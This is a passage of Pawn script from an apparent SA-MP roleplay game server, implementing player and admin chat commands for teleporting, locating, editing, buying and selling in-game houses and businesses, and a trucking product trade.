					SaveKonVal(para1, "pPremiumAccount", 0);
					PINFO[para1][pPDay] = 0;
					SaveKonVal(para1, "pPDay", 0);

			//		new string[512];
					format(string, sizeof(string), "%s got your premium account.", sendername);
					SendMessage(para1, COLOR_WHITE, string);

					new str[512];
					format(str, sizeof(str), "{FFFFFF}Admin %s got premium of player %s.",sendername,name);
					AdminWarn(str);
					}
					else {SendMessage(para1, COLOR_RED, "wrong value !");}
					}
					else {SCM(playerid, COLOR_AdminWarn, "Player is not connected");}
			}
			return 1;
		}
//----------------------{HOUSES}-------------------
    if(strcmp(cmd, "/house", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 6)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /house [housenumber]");
                    return 1;
                }
                new housenum = strval(tmp);
                SetPlayerInterior(playerid,HouseInfo[housenum][hInt]);
                SetPlayerVirtualWorld(playerid,HouseInfo[housenum][hWorld]);
                SetPlayerPosEx(playerid,HouseInfo[housenum][hEntrancex],HouseInfo[housenum][hEntrancey],HouseInfo[housenum][hEntrancez]);
                GameTextForPlayer(playerid, "~w~Teleporting", 5000, 1);
                TooHouse[playerid] = 9999;
                TooHouse[playerid] = housenum;
                Mahal[playerid] = 9999;
                Mahal[playerid] = 3;
                TooBiz[playerid] = 9999;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/houseo", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 5)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /houseo [housenumber]");
                    return 1;
                }
                new housenum = strval(tmp);
                SetPlayerPosEx(playerid,HouseInfo[housenum][hExitx],HouseInfo[housenum][hExity],HouseInfo[housenum][hExitz]);
                GameTextForPlayer(playerid, "~w~Teleporting", 5000, 1);
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/biz", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 6)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /biz [biznumber]");
                    return 1;
                }
                new housenum = strval(tmp);
                SetPlayerInterior(playerid,BizzInfo[housenum][bInterior]);
                SetPlayerPosEx(playerid,BizzInfo[housenum][bExitX],BizzInfo[housenum][bExitY],BizzInfo[housenum][bExitZ]);
                SetPlayerVirtualWorld(playerid,BizzInfo[housenum][bVW]);
                GameTextForPlayer(playerid, "~w~Teleporting", 5000, 1);
    TooBiz[playerid] = 9999;
    TooBiz[playerid] = housenum;
    TooHouse[playerid] = 9999;
    Mahal[playerid] = 9999;
    Mahal[playerid] = 15;
            }
        }
        return 1;
    }
	    if(strcmp(cmd, "/findbiz", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {

                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /findbiz [BizID]");
                    return 1;
                }
				if(OnCheckpoint[playerid] == 1) return SCM(playerid,COLOR_Good,"You already have an enable checkpoint.");
                new housenum = strval(tmp);
                SetPlayerCheckpoint(playerid,BizzInfo[housenum][bEntranceX],BizzInfo[housenum][bEntranceY],BizzInfo[housenum][bEntranceZ],3.0);
				format(string, sizeof(string), "Goto CheckPoint For Biz : %s (%d). Use /recp For Delete Checkpoint.",BizzInfo[housenum][bMessage],housenum);
                SendClientMessage(playerid, COLOR_HOUSE, string);
				OnCheckpoint[playerid] = 1;
				CP[playerid] = 9922555;
        }
        return 1;
    }
	if(strcmp(cmd, "/findsbiz", true) == 0)
	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /findsbiz [SBizID]");
		if(OnCheckpoint[playerid] == 1) return SCM(playerid,COLOR_Good,"You already have an enable checkpoint.");
		new housenum = strval(tmp);
		SetPlayerCheckpoint(playerid,SBizzInfo[housenum][sbEntranceX],SBizzInfo[housenum][sbEntranceY],SBizzInfo[housenum][sbEntranceZ],3.0);
		new string2[256];
		format(string2, sizeof(string2), "Goto CheckPoint For Special Biz : %s (%d). Use /recp For Delete Checkpoint.",SBizzInfo[housenum][sbMessage],housenum);
		SendClientMessage(playerid, COLOR_HOUSE, string2);
		OnCheckpoint[playerid] = 1;
		CP[playerid] = 9922555;
        return 1;
	}
	if(strcmp(cmd, "/findhouse", true) == 0)
	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /findhouse [HouseID]");
		if(OnCheckpoint[playerid] == 1) return SCM(playerid,COLOR_Good,"You already have an enable checkpoint.");
		new housenum = strval(tmp);
		SetPlayerCheckpoint(playerid,HouseInfo[housenum][hExitx],HouseInfo[housenum][hExity],HouseInfo[housenum][hExitz],3.0);
		new string2[128];
		format(string2, sizeof(string2), "Goto CheckPoint For House ID : %d. Use /recp For Delete Checkpoint.",housenum);
		SendClientMessage(playerid, COLOR_HOUSE, string2);
		OnCheckpoint[playerid] = 1;
		CP[playerid] = 9922555;
		return 1;
	}
	    if(strcmp(cmd, "/recp", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {

				OnCheckpoint[playerid] = 0;
				SendClientMessage(playerid, COLOR_RED, "Checkpoint Deleted");
				DisablePlayerCheckpoint(playerid);
        }
        return 1;
    }
    if(strcmp(cmd, "/sbiz", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 3)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /sbiz [biznumber]");
                    return 1;
                }
                new housenum = strval(tmp);
                SetPlayerPosEx(playerid,SBizzInfo[housenum][sbEntranceX],SBizzInfo[housenum][sbEntranceY],SBizzInfo[housenum][sbEntranceZ]);
                GameTextForPlayer(playerid, "~w~Teleporting", 5000, 1);
            }
        }
        return 1;
    }
    //--------------[Edit Command] -----------------------------------------------------------
    if(strcmp(cmd, "/edit", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] <= 8)
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
                return 1;
            }
            new x_job[256];
            x_job = strtok(cmdtext, idx);
            if(!strlen(x_job)) {
                SendClientMessage(playerid, CRISTIAN, "|__________________ <Edit> __________________|");
                SendClientMessage(playerid, COL_SYN, "Syntax: /edit <Name> <Amount>");
                SCM(playerid,COLOR_ROUZ,"Available Names for house: Price,Level,HealthUpgrade(Amount: On/Off),RentPrice,Rentable(Amount: On/Off),ForoshPrice");
                SCM(playerid,COLOR_ROUZ,"Available Names for businesses: Price,Level,EntrancePrice,ProdPrice,Prods");
                SendClientMessage(playerid, CRISTIAN, "|____________________________________________|");
                return 1;
            }
            new Amountt[512];
            Amountt = strtok(cmdtext, idx);
            if(!strlen(Amountt))
            {
                SendClientMessage(playerid, CRISTIAN, "|__________________ <Edit> __________________|");
                SendClientMessage(playerid, COL_SYN, "Syntax: /edit <Name> <Amount>");
                SCM(playerid,COLOR_ROUZ,"Available Names for house: Price,Level,HealthUpgrade(Amount: On/Off),RentPrice,Rentable(Amount: On/Off),ForoshPrice");
                SCM(playerid,COLOR_ROUZ,"Available Names for businesses: Price,Level,EntrancePrice,ProdPrice,Prods");
                SendClientMessage(playerid, CRISTIAN, "|____________________________________________|");
                return 1;
            }
            new proplev = strval(Amountt);
            for(new i = 0; i < sizeof(HouseInfo); i++)
            {
                if (PlayerToPoint(3, playerid,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]))
                {
                    format(string, sizeof(string), "House: %d", i);
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                    if(proplev > 0)
                    {
                        if(strcmp(x_job,"level",true) == 0)
                        {
                            HouseInfo[i][hLevel] = proplev;
                            SaveKonValH(i, "hLevel", proplev);
                        }
                        else if(strcmp(x_job,"price",true) == 0)
                        {
                            HouseInfo[i][hValue] = proplev;
                            SaveKonValH(i, "hValue", proplev);
                        }
                        else if(strcmp(x_job,"Rentprice",true) == 0)
                        {
                            HouseInfo[i][hRent] = proplev;
                            SaveKonValH(i, "hRent", proplev);
                        }
                        else if(!strcmp(x_job,"HealthUpgrade",true))
                        {
                            if(!strcmp(Amountt,"On",true))
                            {
                                HouseInfo[i][hHel] = 1;
                                SaveKonValH(i, "hHel", 1);
                            }
                            else if(!strcmp(Amountt,"Off",true))
                            {
                                HouseInfo[i][hHel] = 0;
                                SaveKonValH(i, "hHel", 0);
                            }
                            else return SendClientMessage(playerid, COL_SYN, "Syntax: /edit HealthUpgrade <On/Off>");
                        }
                        else if(!strcmp(x_job,"Rentable",true))
                        {
                            if(!strcmp(Amountt,"On",true))
                            {
                                HouseInfo[i][hRentabil] = 1;
                                SaveKonValH(i, "hRentabil", 1);
                            }
                            else if(!strcmp(Amountt,"Off",true))
                            {
                                HouseInfo[i][hRentabil] = 0;
                                SaveKonValH(i, "hRentabil", 0);
                            }
                            else return SendClientMessage(playerid, COL_SYN, "Syntax: /edit Rentable <On/Off>");
                        }
                        else if(strcmp(x_job,"ForoshPrice",true) == 0)
                        {
                            if(HouseInfo[i][hOwned] != 2) return SCM(playerid,COLOR_ALI,"This house isn't for sell to set ForoshPrice.");
                            HouseInfo[i][hForosh] = proplev;
                            SaveKonValH(i, "hForosh", proplev);
                        }
                        else
                        {
                            SendClientMessage(playerid, CRISTIAN, "|__________________ <Edit> __________________|");
                            SendClientMessage(playerid, COL_SYN, "Syntax: /edit <Name> <Amount>");
                            SCM(playerid,COLOR_ROUZ,"Available Names for house: Price,Level,HealthUpgrade(Amount: On/Off),RentPrice,Rentable(Amount: On/Off),ForoshPrice");
                            SCM(playerid,COLOR_ROUZ,"Available Names for businesses: Price,Level,EntrancePrice,ProdPrice,Prods");
                            SendClientMessage(playerid, CRISTIAN, "|____________________________________________|");
                            return 1;
                        }
                    }
                }
            }
            for(new i = 0; i < sizeof(BizzInfo); i++)
            {
                if (PlayerToPoint(3, playerid,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]))
                {
                    format(string, sizeof(string), "Biz: %d", i);
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                    if(proplev > 0)
                    {
                        if(strcmp(x_job,"level",true) == 0)
                        {
                            BizzInfo[i][bLevelNeeded] = proplev;
                        }
                        else if(strcmp(x_job,"price",true) == 0)
                        {
                            BizzInfo[i][bBuyPrice] = proplev;
                        }
                        else if(strcmp(x_job,"EntrancePrice",true) == 0)
                        {
                            BizzInfo[i][bEntranceCost] = proplev;
                        }
                        else if(!strcmp(x_job, "PriceProd", true))
                        {
                            BizzInfo[i][bPriceProd] = proplev;
                        }
                        else if(!strcmp(x_job, "Prods", true))
                        {
                            BizzInfo[i][bProducts] = proplev;
                        }
                        OnBizUpdate(i);
                    }
                }
            }
            for(new i = 0; i < sizeof(SBizzInfo); i++)
            {
                if (PlayerToPoint(3, playerid,SBizzInfo[i][sbEntranceX], SBizzInfo[i][sbEntranceY], SBizzInfo[i][sbEntranceZ]))
                {
                    format(string, sizeof(string), "SBiz: %d", i);
                    SendClientMessage(playerid, COLOR_GRAD2, string);
                    if(proplev > 0)
                    {
                        if(strcmp(x_job,"level",true) == 0)
                        {
                            SBizzInfo[i][sbLevelNeeded] = proplev;
                        }
                        else if(strcmp(x_job,"price",true) == 0)
                        {
                            SBizzInfo[i][sbBuyPrice] = proplev;
                        }
                        else if(strcmp(x_job,"EntrancePrice",true) == 0)
                        {
                            SBizzInfo[i][sbEntranceCost] = proplev;
                        }
                        else if(!strcmp(x_job, "PriceProd", true))
                        {
                            SBizzInfo[i][sbPriceProd] = proplev;
                        }
                        else if(!strcmp(x_job, "Prods", true))
                        {
                            SBizzInfo[i][sbProducts] = proplev;
                        }
                        OnSbizUpdate(i);
                    }
                }
            }
            format(string, sizeof(string), "You've adjusted the: %s.", x_job);
            SendClientMessage(playerid, COLOR_WHITE, string);
        }
        return 1;
    }
//-------------------------------------------------------------------------------------
    if(strcmp(cmd, "/load", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new tmpcar = GetPlayerVehicleID(playerid);
            if(!IsAProdsVeh(tmpcar))
            {
                GameTextForPlayer(playerid, "~r~You are not in a delivery truck", 5000, 1);
                return 1;
            }
            format(string, sizeof(string), "Products: %d/%d.", PlayerHaul[tmpcar][pLoad],PlayerHaul[tmpcar][pCapasity]);
            SCM(playerid, TEAM_DangerousTigers_COLOR, string);
        }
        return 1;
    }
    if(strcmp(cmd, "/buyprods", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new tmpcar = GetPlayerVehicleID(playerid);
            new compcost = 1;
            if(PlayerToPoint(80.0, playerid, 2467.7920,-2090.7026,13.5469))
            {
				if(IsAProdsVeh(tmpcar))
                {
                    if(PlayerHaul[tmpcar][pLoad] < PlayerHaul[tmpcar][pCapasity])
                    {
                        new amount;
                        tmp = strtok(cmdtext, idx);
                        if(!strlen(tmp))
                        {
                            SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /buyprods [amount]");
                            return 1;
                        }
                        amount = strval(tmp);
                        if(amount < 1 || amount > 500) { SendClientMessage(playerid, COLOR_GREY, "   Can't buy less then 1 Product or more then 500!"); return 1; }
                        new check= PlayerHaul[tmpcar][pLoad] + amount;
                        if(check > PlayerHaul[tmpcar][pCapasity])
                        {
                            format(string, sizeof(string), "   You went over the Truck Products Carry Limit of %d, you currently carry %d.",PlayerHaul[tmpcar][pCapasity],PlayerHaul[tmpcar][pLoad]);
                            SendClientMessage(playerid, COLOR_GREY, string);
                            return 1;
                        }
                        new cost = amount*compcost;
                        if(GetPlayerPool(playerid) >= cost)
                        {
                            PlayerHaul[tmpcar][pLoad] += amount;
                            format(string, sizeof(string), "Products: %d/%d.", PlayerHaul[tmpcar][pLoad],PlayerHaul[tmpcar][pCapasity]);
                            SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                            format(string, sizeof(string), "You bought %d Products for $%s.", amount,FormatNumber(cost));
                            SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                            GivePlayerPool(playerid,-cost);
                            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                            //SBizzInfo[12][sbTill] += cost;//prods buisness
                            //ExtortionSBiz(12, 100);
                            return 1;
                        }
                        else
                        {
                            format(string, sizeof(string), "You cant afford %d Products at $%ds", amount,FormatNumber(cost));
                            SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                            return 1;
                        }
                    }
                    else
                    {
                            format(string, sizeof(string), "Products: %d/%d.", PlayerHaul[tmpcar][pLoad],PlayerHaul[tmpcar][pCapasity]);
                            SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                            return 1;
                    }
                }
                else
                {
                    SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, "This Vehicle does not deliver Products or you are not in a vehicle.");
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "You are not in trucker place.");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/sellprods", true) == 0)
    {
        new cashmade;
        new tmpcar;
        if(IsPlayerConnected(playerid))
        {
            tmpcar = GetPlayerVehicleID(playerid);
            if(!IsAProdsVeh(tmpcar))
            {
                GameTextForPlayer(playerid, "~r~You are not in a delivery truck", 5000, 1);
                return 1;
            }
            if(PlayerHaul[tmpcar][pLoad] == 0)
            {
                GameTextForPlayer(playerid, "~r~Truck is empty, return to the stock house", 5000, 1);
                format(string, sizeof(string), "Products: %d/%d.", PlayerHaul[tmpcar][pLoad],PlayerHaul[tmpcar][pCapasity]);
                SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                return 1;
            }
            for(new i = 0; i < sizeof(BizzInfo); i++)
            {
                if (PlayerToPoint(10, playerid,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]))
                {
                    for(new l = PlayerHaul[tmpcar][pLoad]; l > 0; l--)
                    {
                        if(BizzInfo[i][bProducts] == BizzInfo[i][bMaxProducts])
                        {
                            GameTextForPlayer(playerid, "~r~Our stores are full", 5000, 1);
                            format(string, sizeof(string), "Cash Earned $%s.", FormatNumber(cashmade));
                            SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                            format(string, sizeof(string), "Products: %d/%d.", PlayerHaul[tmpcar][pLoad],PlayerHaul[tmpcar][pCapasity]);
                            SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                            return 1;
                        }
                        if(BizzInfo[i][bPriceProd] > BizzInfo[i][bTill])
                        {
                            GameTextForPlayer(playerid, "~r~We Cant Afford The Deal", 5000, 1);
                            format(string, sizeof(string), "Cash Earned $%s.",FormatNumber(cashmade));
                            SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                            format(string, sizeof(string), "Products: %d/%d.", PlayerHaul[tmpcar][pLoad],PlayerHaul[tmpcar][pCapasity]);
                            SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                            return 1;
                        }
                        PlayerHaul[tmpcar][pLoad]--;
                        BizzInfo[i][bProducts]++;
                        cashmade = cashmade+BizzInfo[i][bPriceProd];
                        GivePlayerPool(playerid,BizzInfo[i][bPriceProd]);
                        BizzInfo[i][bTill] -= BizzInfo[i][bPriceProd];
                        if(PlayerHaul[tmpcar][pLoad] == 0)
                        {
                            GameTextForPlayer(playerid, "~r~Truck is empty, return to the stock house", 5000, 1);
                            format(string, sizeof(string), "Cash Earned $%s.", FormatNumber(cashmade));
                            SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                            format(string, sizeof(string), "Products: %d/%d.", PlayerHaul[tmpcar][pLoad],PlayerHaul[tmpcar][pCapasity]);
                            SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                            return 1;
                        }
                    }
                    OnBizUpdate(i);
                    return 1;
                }
            }
        }
        for(new i = 0; i < sizeof(SBizzInfo); i++)
        {
            if (PlayerToPoint(10, playerid,SBizzInfo[i][sbEntranceX], SBizzInfo[i][sbEntranceY], SBizzInfo[i][sbEntranceZ]))
            {
                //printf("Found House :%d",i);
                for(new l = PlayerHaul[tmpcar][pLoad]; l > 0; l--)
                {
                    if(SBizzInfo[i][sbProducts] == SBizzInfo[i][sbMaxProducts])
                    {
                        GameTextForPlayer(playerid, "~r~Our stores are full", 5000, 1);
                        format(string, sizeof(string), "Cash Earned $%s.", FormatNumber(cashmade));
                        SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                        format(string, sizeof(string), "Products: %d/%d.", PlayerHaul[tmpcar][pLoad],PlayerHaul[tmpcar][pCapasity]);
                        SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                        return 1;
                    }
                    if(SBizzInfo[i][sbPriceProd] > SBizzInfo[i][sbTill])
                    {
                        GameTextForPlayer(playerid, "~r~We Cant Afford The Deal", 5000, 1);
                        format(string, sizeof(string), "Cash Earned $%s.", FormatNumber(cashmade));
                        SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                        format(string, sizeof(string), "Products: %d/%d.", PlayerHaul[tmpcar][pLoad],PlayerHaul[tmpcar][pCapasity]);
                        SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                        return 1;
                    }
                    PlayerHaul[tmpcar][pLoad]--;
                    SBizzInfo[i][sbProducts]++;
                    cashmade = cashmade+SBizzInfo[i][sbPriceProd];
                    GivePlayerPool(playerid,SBizzInfo[i][sbPriceProd]);
                    SBizzInfo[i][sbTill] -= SBizzInfo[i][sbPriceProd];
                    if(PlayerHaul[tmpcar][pLoad] == 0)
                    {
                        GameTextForPlayer(playerid, "~r~Truck is empty, return to the stock house", 5000, 1);
                        format(string, sizeof(string), "Cash Earned $%s.", FormatNumber(cashmade));
                        SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                        format(string, sizeof(string), "Products: %d/%d.", PlayerHaul[tmpcar][pLoad],PlayerHaul[tmpcar][pCapasity]);
                        SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
                        return 1;
                    }
                }
                OnSbizUpdate(i);
                return 1;
            }
        }
        GameTextForPlayer(playerid, "~r~To Far From A Business", 5000, 1);
        return 1;
    }
//----------------------------------[BIZZ]-----------------------------------------------
    if(strcmp(cmd, "/buybiz", true) == 0)
    {
        new biz = PINFO[playerid][pPbiskey];
        if(biz != 9999) return SCM(playerid,COL_SYN,"You already have a business.");
        new level = PINFO[playerid][pLevel];
        for(new i = 0;i<sizeof BizzInfo;i++)
        {
            if(IsPlayerInRangeOfPoint(playerid,3.0,BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ]))
            {
                if(level < BizzInfo[i][bLevelNeeded]) return SCM(playerid,COLOR_ALI,"You haven't enough level to buy this business.");
                if(BizzInfo[i][bOwned] == 0)
                {
                    if(GetPlayerPool(playerid) < BizzInfo[i][bBuyPrice]) return SCM(playerid,COLOR_ALI,"You haven't enough money to buy this business.");
                    GivePlayerPool(playerid,-BizzInfo[i][bBuyPrice]);
                    PINFO[playerid][pPbiskey] = i;
                    SaveKonVal(playerid, "pPbiskey", i);
                    BizzInfo[i][bOwned] = 1;
                    strmid(BizzInfo[i][bOwner],PINFO[playerid][pName],0,strlen(PINFO[playerid][pName]),64);
                    PlayerPlayMusic(playerid);
		   // SetPlayerInterior(playerid,BizzInfo[i][bInterior]);
                  //  SetPlayerPosEx(playerid,BizzInfo[i][bExitX],BizzInfo[i][bExitY],BizzInfo[i][bExitZ]);
		   // SetPlayerPosEx(playerid,BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ]);
		   // SetPlayerInterior(playerid,0);
               //     TooBiz[playerid] = i;
                   // SetPlayerVirtualWorld(playerid,BizzInfo[i][bVW]);
                    GameTextForPlayer(playerid, "~w~Welcome~n~You can exit at any time by moving to this door and Type /enter", 5000, 3);
                    Mahal[playerid] = 15;
                    TooHouse[playerid] = 9999;
                    SendClientMessage(playerid, COLOR_WHITE, "Congratulations, On Your New Purchase.");
                    SendClientMessage(playerid, COLOR_WHITE, "Type /help to review the new business help section.");
                    OnBizUpdate(i);
                    //SaveAccount(playerid);
                    return 1;
                }
                if(BizzInfo[i][bOwned] == 2)
                {
                    if(GetPlayerPool(playerid) < BizzInfo[i][bForosh]) return SCM(playerid,COLOR_ALI,"You haven't enough money to buy this business.");
                    new OwnerA = ReturnUserEx(BizzInfo[i][bOwner]);
                    if(IsPlayerConnected(OwnerA) && gPlayerLogged[OwnerA] == 1)
                    {
                        GivePlayerPool(playerid,-BizzInfo[i][bForosh]);
                        PlayerInfo[playerid][pPbiskey] = i;
                        SaveKonVal(playerid, "pPbiskey", i);
                        PlayerInfo[OwnerA][pPbiskey] = 9999;
                        SaveKonVal(OwnerA, "pPbiskey", 9999);
                        BizzInfo[i][bOwned] = 1;
                        strmid(BizzInfo[i][bOwner],PINFO[playerid][pName],0,strlen(PINFO[playerid][pName]),64);
                        PlayerInfo[OwnerA][pAccount] += BizzInfo[i][bForosh];
                        SaveKonVal(OwnerA, "pAccount", PINFO[OwnerA][pAccount]);
                        PlayerPlayMusic(playerid);
			//SetPlayerInterior(playerid,BizzInfo[i][bInterior]);
			//SetPlayerPosEx(playerid,BizzInfo[i][bExitX],BizzInfo[i][bExitY],BizzInfo[i][bExitZ]);
			//TooBiz[playerid] = i;
			//SetPlayerVirtualWorld(playerid,BizzInfo[i][bVW]);
                        GameTextForPlayer(playerid, "~w~Welcome~n~You can exit at any time by moving to this door and Type /enter", 5000, 3);
                        Mahal[playerid] = 15;
                        TooHouse[playerid] = 9999;
                        SendClientMessage(playerid, COLOR_WHITE, "Congratulations, On Your New Purchase.");
                        SendClientMessage(playerid, COLOR_WHITE, "Type /help to review the new business help section.");
                        OnBizUpdate(i);
                        //SaveAccount(playerid);
                        //SaveAccount(OwnerA);
                        return 1;
                    }
                    else
                    {
                        SellOfflinePlayerBiz(playerid,i);
                        return 1;
                    }
                }
            }
        }
        for(new i = 0;i<sizeof SBizzInfo;i++)
        {
            if(IsPlayerInRangeOfPoint(playerid,3,SBizzInfo[i][sbEntranceX],SBizzInfo[i][sbEntranceY],SBizzInfo[i][sbEntranceZ]))
            {
                if(level < SBizzInfo[i][sbLevelNeeded]) return SCM(playerid,COLOR_ALI,"You haven't enough level to buy this business.");
                if(SBizzInfo[i][sbOwned] == 0)
                {
                    if(GetPlayerPool(playerid) < SBizzInfo[i][sbBuyPrice]) return SCM(playerid,COLOR_ALI,"You haven't enough money to buy this business.");
                    GivePlayerPool(playerid,-SBizzInfo[i][sbBuyPrice]);
                    PlayerInfo[playerid][pPbiskey] = i+500;
                    SaveKonVal(playerid, "pPbiskey", PINFO[playerid][pPbiskey]);
                    SBizzInfo[i][sbOwned] = 1;
                    strmid(SBizzInfo[i][sbOwner], PINFO[playerid][pName], 0, strlen(PINFO[playerid][pName]), 255);
                    PlayerPlayMusic(playerid);
                    SendClientMessage(playerid, COLOR_WHITE, "Congratulations, On Your New Purchase.");
                    SendClientMessage(playerid, COLOR_WHITE, "Type /help to review the new business help section.");
                    OnSbizUpdate(i);
                    //SaveAccount(playerid);
                    return 1;
                }
                if(SBizzInfo[i][sbOwned] == 2)
                {
                    if(GetPlayerPool(playerid) < SBizzInfo[i][sbForosh]) return SCM(playerid,COLOR_ALI,"You haven't enough money to buy this business.");
                    new dad = ReturnUserEx(SBizzInfo[i][sbOwner]);
                    if(IsPlayerConnected(dad) && gPlayerLogged[dad] == 1)
                    {
                        GivePlayerPool(playerid,-SBizzInfo[i][sbForosh]);
                        PlayerInfo[playerid][pPbiskey] = i+500;
                        SaveKonVal(playerid, "pPbiskey", PINFO[playerid][pPbiskey]);
                        PlayerInfo[dad][pPbiskey] = 9999;
                        SaveKonVal(dad, "pPbiskey", 9999);
                        SBizzInfo[i][sbOwned] = 1;
                        strmid(SBizzInfo[i][sbOwner], PINFO[playerid][pName], 0, strlen(PINFO[playerid][pName]), 255);
                        PlayerPlayMusic(playerid);
                        PINFO[dad][pAccount] += SBizzInfo[i][sbForosh];
                        SaveKonVal(dad, "pAccount", PINFO[dad][pAccount]);
                        SendClientMessage(playerid, COLOR_WHITE, "Congratulations, On Your New Purchase.");
                        SendClientMessage(playerid, COLOR_WHITE, "Type /help to review the new business help section.");
                        OnSbizUpdate(i);
                        //SaveAccount(playerid);
                        //SaveAccount(dad);
                        return 1;
                    }
                    else
                    {
                        SellOfflinePlayerSBiz(playerid,i); return 1;
                    }
                }
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/sellbiz", true) == 0)
    {
        new biz = PINFO[playerid][pPbiskey];
        if(biz == 9999) return SCM(playerid, COL_SYN, "You don't own a business.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) { SCM(playerid,COL_SYN,"Syntax: /sellbiz <Price>"); return SCM(playerid,COLOR_ALI,"Use 0 for price to disable it."); }
        new price = strval(tmp);
        if(price <= -1 || price >= 5000001) return SCM(playerid,COLOR_ALI,"Type a price number between 1 and $5,000,000 or 0 to disable it.");
        if(biz >= 500)
        {
            if(price == 0)
            {
                SBizzInfo[biz][sbOwned] = 1;
                SBizzInfo[biz][sbForosh] = 0;
                OnSbizUpdate(biz-500);
                return SCM(playerid,COLOR_ALI,"SellBiz {FFFFFF}Disabled.");
            }
            if(price >= 1)
            {
                SBizzInfo[biz][sbOwned] = 2;
                SBizzInfo[biz][sbForosh] = price;
                OnSbizUpdate(biz-500);
                format(string,256,"Your biz is for sell, Price: $%s",FormatNumber(price));
                return SCM(playerid,COLOR_ALI,string);
            }
        }
        else
        {
            if(price == 0)
            {
                BizzInfo[biz][bOwned] = 1;
                BizzInfo[biz][bForosh] = 0;
                OnBizUpdate(biz);
                return SCM(playerid,COLOR_ALI,"SellBiz {FFFFFF}Disabled.");
            }
            if(price >= 1)
            {
                BizzInfo[biz][bOwned] = 2;
                BizzInfo[biz][bForosh] = price;
                OnBizUpdate(biz);
                format(string,256,"Your biz is for sell, Price: $%s",FormatNumber(price));
                return SCM(playerid,COLOR_ALI,string);
            }
        }
        return 1;
    }
    if (strcmp(cmd, "/bizinfo", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pPbiskey];
            if(bouse == 9999)
            {
                SendClientMessage(playerid, COL_SYN, "You don't own a business.");
                return 1;
            }
            if (bouse >= 500)
            {

                PrintSBizInfo(playerid,bouse-500);
            }
            else
            {
                PrintBizInfo(playerid,bouse);
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/prodprice", true) == 0)
    {
        new bouse = PlayerInfo[playerid][pPbiskey];
        if (bouse == 9999)
        {
            SendClientMessage(playerid, COL_SYN, "You don't own a business.");
            return 1;
        }
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp))
        {
            return SendClientMessage(playerid, COL_SYN, "Syntax: /prodprice <Price>");
        }
        if(strval(tmp) < 1 || strval(tmp) > 10)
        {
            SendClientMessage(playerid, COLOR_WHITE, "Price must be between $1 and $10.");
            return 1;
        }
        if (bouse >= 500)
        {
            SBizzInfo[bouse-500][sbPriceProd] = strval(tmp);
